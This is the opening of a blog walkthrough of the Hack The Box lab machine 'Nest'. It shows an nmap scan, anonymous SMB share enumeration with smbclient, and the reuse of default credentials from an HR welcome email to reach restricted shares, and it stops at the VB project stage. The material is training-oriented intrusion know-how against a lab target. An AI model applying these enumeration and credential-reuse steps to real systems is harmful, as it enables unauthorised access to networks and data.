<!DOCTYPE html>
<html lang="">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.80.0" />

    
    
    

<title>Hack The Box - Nest • Haax - Personal Blog</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box - Nest"/>
<meta name="twitter:description" content="Nest is a Windows machine considered easy/medium. An anonymous SMB access allows to retrieve a first non-privileged account. The recovery of an encrypted password and sources of a Visual Basic project allows lead the user&rsquo;s password decryption. Privilege escalation is done through a &ldquo;reporting&rdquo; service allowing to get a new encrypted string on the disk. The decryption of this last one allows an administrator access."/>

<meta property="og:title" content="Hack The Box - Nest" />
<meta property="og:description" content="Nest is a Windows machine considered easy/medium. An anonymous SMB access allows to retrieve a first non-privileged account. The recovery of an encrypted password and sources of a Visual Basic project allows lead the user&rsquo;s password decryption. Privilege escalation is done through a &ldquo;reporting&rdquo; service allowing to get a new encrypted string on the disk. The decryption of this last one allows an administrator access." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://haax9.github.io/en/walkthroughs/hackthebox/nest/" />
<meta property="article:published_time" content="2020-06-07T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-06-07T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

    

</head>


    <body >
        
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      
      
          <a href="https://haax9.github.io/en">
          
          
          
          <div class="author-image">
            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
        
      <p class="site__description">
        <a href="https://haax9.github.io">
         Infosec articles &amp; CTF Writeups 
      </a>
      </p>
    </div>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/en/articles/">
						<span>Articles</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/walkthroughs/">
						<span>Walkthroughs</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/writeups/">
						<span>Write-Ups</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/about/">
						<span>About</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/conferences/">
						<span>Conferences</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="https://cheatsheet.haax.fr">
						<span>Cheatsheet</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/Haax9_" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
  
	
	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
	
	
	
	&nbsp;<a href="https://haax.fr/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
	</section>

    </p>
    <div class="langSection">
      
      
      <a rel="alternate" href="/fr/walkthroughs/hackthebox/nest/" hreflang="fr" lang="fr" class="langLink">Français</a>
      <a rel="alternate" href="/fr/walkthroughs/hackthebox/nest/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
      </div>
    <p class="copyright">
      &copy; 2023 Haax.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
  <div>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Hack The Box - Nest</h1>
    
    
<div class="post__meta">
    
    
      <i class="fas fa-calendar-alt"></i> Jun 7, 2020
    
    
    
    
    <br/>
    <i class="fas fa-clock"></i> 16 min read
</div>


  </header>
  <div class="post">
    <p>Nest is a Windows machine considered easy/medium. An anonymous SMB access allows to retrieve a first non-privileged account. The recovery of an encrypted password and sources of a Visual Basic project allows lead the user&rsquo;s password decryption. Privilege escalation is done through a &ldquo;reporting&rdquo; service allowing to get a new encrypted string on the disk. The decryption of this last one allows an administrator access.</p>
<p><strong>Disclaimer :</strong> It is a rather quick presentation that deliberately omits the various research areas. Only the actual results and a quick approach are presented. Furthermore, I didn&rsquo;t have lot of time to write and translate this write-up, so I used deepl.com translator for some parts ! I&rsquo;m sorry if the english is not that good ! :)</p>
<h2 id="discovery--enumeration">Discovery / Enumeration</h2>
<p>A quick port scan gives us running services on the machine</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -sS -p 0-10000 -T4 -sV -sC default -O -v -oN scan_nmap 10.10.10.178

Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.178
Host is up <span style="color:#f92672">(</span>0.030s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">9999</span> filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR &lt;Directory_Name&gt;
|     RUNQUERY &lt;Query_ID&gt;
|     DEBUG &lt;Password&gt;
|_    HELP &lt;Command&gt;
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V<span style="color:#f92672">=</span>7.70%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>2/23%Time<span style="color:#f92672">=</span>5E52D49C%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
SF:LL,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLin
SF:es,3A,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognise
</span><span style="color:#e6db74">SF:d\x20command\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,3A,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x2
</span><span style="color:#e6db74">SF:0V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,3A,<span style="color:#e6db74">&#34;\r\
</span><span style="color:#e6db74">SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20comma
</span><span style="color:#e6db74">SF:nd\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,3A,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
</span><span style="color:#e6db74">SF:n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Repo
</span><span style="color:#e6db74">SF:rting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBindReqTCP,21,<span style="color:#e6db74">&#34;\r\nHQK
</span><span style="color:#e6db74">SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatusRequestTCP,21,<span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,F2,<span style="color:#e6db74">&#34;\r\nHQK\
</span><span style="color:#e6db74">SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nThis\x20service\x20allows\
</span><span style="color:#e6db74">SF:x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20th
</span><span style="color:#e6db74">SF:e\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---
</span><span style="color:#e6db74">SF:\r\n\r\nLIST\r\nSETDIR\x20&lt;Directory_Name&gt;\r\nRUNQUERY\x20&lt;Query_ID&gt;\r\
</span><span style="color:#e6db74">SF:nDEBUG\x20&lt;Password&gt;\r\nHELP\x20&lt;Command&gt;\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,21,<span style="color:#e6db74">&#34;\r
</span><span style="color:#e6db74">SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,21,<span style="color:#e6db74">&#34;\
</span><span style="color:#e6db74">SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,21,<span style="color:#e6db74">&#34;\r\nH
</span><span style="color:#e6db74">SF:QK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,21,<span style="color:#e6db74">&#34;\r\nHQK
</span><span style="color:#e6db74">SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Probe,21,<span style="color:#e6db74">&#34;\r\nHQK\x20
</span><span style="color:#e6db74">SF:Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,3A,<span style="color:#e6db74">&#34;\r\nHQ
</span><span style="color:#e6db74">SF:K\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\
</span><span style="color:#e6db74">SF:r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n
</span><span style="color:#e6db74">SF:&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\
</span><span style="color:#e6db74">SF:n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPBindReq,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n
</span><span style="color:#e6db74">SF:&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,3A,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\
</span><span style="color:#e6db74">SF:r\nUnrecognised\x20command\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk-RC,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting
</span><span style="color:#e6db74">SF:\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporti
</span><span style="color:#e6db74">SF:ng\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NCP,21,<span style="color:#e6db74">&#34;\r\nHQK\x20Reporting\x20Ser
</span><span style="color:#e6db74">SF:vice\x20V1\.2\r\n\r\n&gt;&#34;</span><span style="color:#f92672">)</span>;
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Device type: general purpose|phone|specialized
Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 8|Phone|2008|7|8.1|Vista <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> Professional or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Uptime guess: 1.473 days <span style="color:#f92672">(</span>since Sat Feb <span style="color:#ae81ff">22</span> 09:20:24 2020<span style="color:#f92672">)</span>
TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">262</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
IP ID Sequence Generation: Incremental

Host script results:
|_clock-skew: mean: 1m52s, deviation: 0s, median: 1m52s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-23 20:42:32
|_  start_date: 2020-02-22 09:23:12

NSE: Script Post-scanning.
Initiating NSE at 20:41
Completed NSE at 20:41, 0.00s elapsed
Initiating NSE at 20:41
Completed NSE at 20:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1012.52 seconds
           Raw packets sent: <span style="color:#ae81ff">30720</span> <span style="color:#f92672">(</span>1.357MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">663</span> <span style="color:#f92672">(</span>31.066KB<span style="color:#f92672">)</span>
</code></pre></div><p>The scan is revealing that 2 ports are open. The classical 445 but also the 4386 which seems to be a &ldquo;Reporting&rdquo; service.</p>
<h2 id="anonymous-smb-access-and-temporary-account">Anonymous SMB access and temporary account</h2>
<p>For the first research, we can start with a service we already know, SMB shares. Thanks to an anonymous connection, we are able to list the readable shares.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;&#34;</span> -L <span style="color:#ae81ff">\\\\</span>10.10.10.178
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    Data            Disk      
    IPC$            IPC       Remote IPC
    Secure$         Disk      
    Users           Disk      
SMB1 disabled -- no workgroup available
</code></pre></div><p>3 shares can be interesting for the moment:</p>
<ul>
<li>Data</li>
<li>Secure$</li>
<li>USers$</li>
</ul>
<p>We start by looking at the <code>Users$</code> share, which among other things allows us to retrieve the list of users on the machine. Useful!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Users
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 00:04:21 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 00:04:21 <span style="color:#ae81ff">2020</span>
  Administrator                       D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:08:23 <span style="color:#ae81ff">2019</span>
  C.Smith                             D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:21:44 <span style="color:#ae81ff">2020</span>
  L.Frost                             D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 19:03:01 <span style="color:#ae81ff">2019</span>
  R.Thompson                          D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 19:02:50 <span style="color:#ae81ff">2019</span>
  TempUser                            D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:55:56 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545336</span> blocks available
</code></pre></div><p>Being curious, we can try the <code>Secure$</code> share. But the name is true, this one is more secured, and we can&rsquo;t log without a user account.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Secure$
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\*</span>
</code></pre></div><p>Last unexplored way, the <code>Data</code> share. We can see different things.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Data   
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:53:46 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:53:46 <span style="color:#ae81ff">2019</span>
  IT                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:58:07 <span style="color:#ae81ff">2019</span>
  Production                          D        <span style="color:#ae81ff">0</span>  Mon Aug  <span style="color:#ae81ff">5</span> 23:53:38 <span style="color:#ae81ff">2019</span>
  Reports                             D        <span style="color:#ae81ff">0</span>  Mon Aug  <span style="color:#ae81ff">5</span> 23:53:44 <span style="color:#ae81ff">2019</span>
  Shared                              D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:07:51 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545336</span> blocks available
</code></pre></div><p>After some research, we quickly come across a &ldquo;Welcome Email&rdquo; text file. This type of file can be very interesting because it can contain information such as default accounts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\S</span>hared<span style="color:#ae81ff">\T</span>emplates<span style="color:#ae81ff">\H</span>R<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:08:01 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:08:01 <span style="color:#ae81ff">2019</span>
  Welcome Email.txt                   A      <span style="color:#ae81ff">425</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:55:36 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545577</span> blocks available

smb: <span style="color:#ae81ff">\S</span>hared<span style="color:#ae81ff">\T</span>emplates<span style="color:#ae81ff">\H</span>R<span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Welcome Email.txt&#34;</span>
getting file <span style="color:#ae81ff">\S</span>hared<span style="color:#ae81ff">\T</span>emplates<span style="color:#ae81ff">\H</span>R<span style="color:#ae81ff">\W</span>elcome Email.txt of size <span style="color:#ae81ff">425</span> as Welcome Email.txt <span style="color:#f92672">(</span>3.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.9 KiloBytes/sec<span style="color:#f92672">)</span>
</code></pre></div><p>By getting this file, we manage to get the first real foothold, a user account !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat Welcome<span style="color:#ae81ff">\ </span>Email.txt 
We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;

You will find your home folder in the following location: 
<span style="color:#ae81ff">\\</span>HTB-NEST<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\&lt;</span>USERNAME&gt;

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below <span style="color:#66d9ef">until</span> all systems have been set up <span style="color:#66d9ef">for</span> you.

Username: TempUser
Password: welcome2019

Thank you
HR%        
</code></pre></div><p>We then try to log in to the <code>Secure$</code> share using our new account and boom, it is now in range for us.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;TempUser&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Secure$
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\T</span>empUser<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 01:08:12 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 01:08:12 <span style="color:#ae81ff">2019</span>
  Finance                             D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:40:13 <span style="color:#ae81ff">2019</span>
  HR                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 01:08:11 <span style="color:#ae81ff">2019</span>
  IT                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 12:59:25 <span style="color:#ae81ff">2019</span>
</code></pre></div><h2 id="enumeration-and-gathering-vb-project">Enumeration and gathering VB project</h2>
<p>Here begins a new enumeration phase. Indeed, all the elements that were not previously accessible have to be analyzed, looking for new information.
This includes a portion of the previously inaccessible <code>Data$</code> share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;TempUser&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Data    
Enter WORKGROUP<span style="color:#ae81ff">\T</span>empUser<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> cd IT
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:58:07 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:58:07 <span style="color:#ae81ff">2019</span>
  Archive                             D        <span style="color:#ae81ff">0</span>  Tue Aug  <span style="color:#ae81ff">6</span> 00:33:58 <span style="color:#ae81ff">2019</span>
  Configs                             D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:59:34 <span style="color:#ae81ff">2019</span>
  Installs                            D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:08:30 <span style="color:#ae81ff">2019</span>
  Reports                             D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 01:09:13 <span style="color:#ae81ff">2020</span>
  Tools                               D        <span style="color:#ae81ff">0</span>  Tue Aug  <span style="color:#ae81ff">6</span> 00:33:43 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545577</span> blocks available
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\&gt;</span> cd
</code></pre></div><p>Using the method we previsouly used for the welcome email, we quickly find an interesting file, located in one of the configuration folders, which seems to be used for a project called &ldquo;RU Scanner&rdquo;.</p>
